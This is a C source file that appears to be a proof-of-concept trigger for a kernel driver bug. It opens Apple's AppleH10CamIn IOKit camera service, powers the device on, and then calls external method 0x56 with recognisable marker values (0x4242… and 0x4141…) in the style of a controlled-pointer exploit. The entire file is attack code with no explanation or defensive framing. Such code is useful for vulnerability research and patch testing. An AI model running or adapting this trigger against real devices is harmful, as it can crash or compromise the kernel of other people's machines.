#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>

typedef mach_port_name_t io_service_t;
typedef mach_port_name_t task_port_t;
typedef mach_port_name_t io_connect_t;

extern io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef);
extern kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type,
                                   io_connect_t *connect);
extern CFDictionaryRef IOServiceMatching(const char *name);
extern const mach_port_t kIOMasterPortDefault;

extern kern_return_t
IOConnectCallScalarMethod(
    mach_port_t  connection,        // In
    uint32_t     selector,      // In
    const uint64_t  *input,         // In
    uint32_t     inputCnt,      // In
    uint64_t    *output,        // Out
                          uint32_t    *outputCnt);     // In/Out


int main() {

    const char *service_name = "AppleH10CamIn";
    io_service_t service =
        IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(service_name));
    if (service == MACH_PORT_NULL) {
        printf("[-] Cannot get matching service of %s\n", service_name);
        return 0;
    }

    printf("[+] Get matching service of %s succeed, service = 0x%x\n", service_name, service);

    io_connect_t client = MACH_PORT_NULL;
    kern_return_t ret = IOServiceOpen(service, mach_task_self(), 0, &client);
    if (ret != KERN_SUCCESS) {
        printf("[-] Open service of %s failed, Reason: %s\n", service_name, mach_error_string(ret));
        return 0;
    }
    printf("[+] Create IOUserClient of %s succeed, client = 0x%x\n", service_name, client);

    ret = IOConnectCallScalarMethod(client, 11, NULL, 0, NULL, NULL);
    if (ret != KERN_SUCCESS) {
           printf("[-] enable power:  0x%x %s\n", ret, mach_error_string(ret));
           return 0;
    }

    while (1) {
        uint64_t is_power = 0;
        uint32_t is_power_count = 1;
        ret = IOConnectCallScalarMethod(client, 5, NULL, 0, &is_power, &is_power_count);
        if (ret != KERN_SUCCESS) {
            printf("[-] is_power: %s\n", mach_error_string(ret));
            return 0;
        }
        
        if (is_power)
            break;
    }
    printf("[+] powered on!\n");

	uint64_t args[3] = { 0 };
	args[0] = 0x4242424242424242;
	args[1] = 0x4141414141414141;
	args[2] = 0x00;

	ret = IOConnectCallScalarMethod(client, 0x56, args, 3, NULL, NULL);
	if (ret != KERN_SUCCESS) {
		printf("[-] 0x56: %s\n", mach_error_string(ret));
		return 0;
	}
    return 0;
}
